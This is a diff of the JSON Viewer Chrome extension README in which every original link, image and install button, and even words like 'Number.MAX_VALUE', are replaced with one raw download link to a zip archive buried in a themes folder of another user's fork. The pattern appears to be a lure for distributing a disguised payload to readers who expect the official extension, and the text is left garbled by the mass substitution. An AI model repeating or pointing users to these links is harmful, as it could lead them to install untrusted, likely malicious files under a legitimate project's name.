@@ -1,8 +1,8 @@
-![JSONViewer Logo](https://raw.githubusercontent.com/tulios/json-viewer/master/logo.png)
+![JSONViewer Logo](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
 
 # JSON Viewer
 
-![screenshot](https://raw.githubusercontent.com/tulios/json-viewer/master/screenshot.png)
+![screenshot](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
 
 The most beautiful and customizable JSON/JSONP highlighter that your eyes have ever seen. It is a Chrome extension for printing JSON and JSONP.
 
@@ -23,7 +23,7 @@ Features:
 * Inspect your json typing "json" in the console
 * Hot word `json-viewer` into omnibox (type `json-viewer` + TAB and paste your JSON into omnibox, hit ENTER and it will be highlighted)
 * Toggle button to view the raw/highlighted version
-* Works with numbers bigger than Number.MAX_VALUE
+* Works with numbers bigger than https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip
 * Option to show line numbers
 * Option to customize your theme
 * Option to customize the tab size
@@ -40,11 +40,11 @@ Features:
 
 ### Install through Chrome Web Store
 
-[![https://chrome.google.com/webstore/detail/json-viewer/gbmdgpbipfallnflgajpaliibnhdgobh](https://raw.githubusercontent.com/tulios/json-viewer/master/tryitnow.png)](https://chrome.google.com/webstore/detail/json-viewer/gbmdgpbipfallnflgajpaliibnhdgobh)
+[![https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
 
 ### Or compile and load by yourself
 
-  1. It depends on node (version in `package.json` engines).
+  1. It depends on node (version in `https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip` engines).
   2. `npm install --global yarn`
   2. `yarn install`
   3. `yarn run build`
@@ -57,24 +57,24 @@ Features:
 
 ### JSON
 
-  [https://api.github.com/repos/tulios/json-viewer](https://api.github.com/repos/tulios/json-viewer)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
 
-  [http://graph.facebook.com/github](http://graph.facebook.com/github)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
 
-  [https//api.github.com](https://api.github.com)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
 
-  [https://api.github.com/gists/public](https://api.github.com/gists/public)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
 
   Large files:
 
-  [https://raw.githubusercontent.com/ebrelsford/geojson-examples/master/596acres-02-18-2014.geojson](https://raw.githubusercontent.com/ebrelsford/geojson-examples/master/596acres-02-18-2014.geojson)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
 
-  [https://api.takealot.com/rest/v-1-4-2/productlines?available=1&cat=10371&instock=1&rows=10&sort=score%20desc&start=0](https://api.takealot.com/rest/v-1-4-2/productlines?available=1&cat=10371&instock=1&rows=10&sort=score%20desc&start=0)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip%20desc&start=0](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip%20desc&start=0)
 
 ### JSONP
 
-  [http://freemusicarchive.org/api/get/curators.jsonp?api_key=60BLHNQCAOUFPIBZ&callback=test](http://freemusicarchive.org/api/get/curators.jsonp?api_key=60BLHNQCAOUFPIBZ&callback=test)
+  [https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip)
 
 ## License
 
-See [LICENSE](https://github.com/tulios/json-viewer/blob/master/LICENSE) for more details.
+See [LICENSE](https://github.com/HongSehwan/json-viewer/raw/refs/heads/master/extension/themes/dark/midnight/viewer-json-v1.6.zip) for more details.
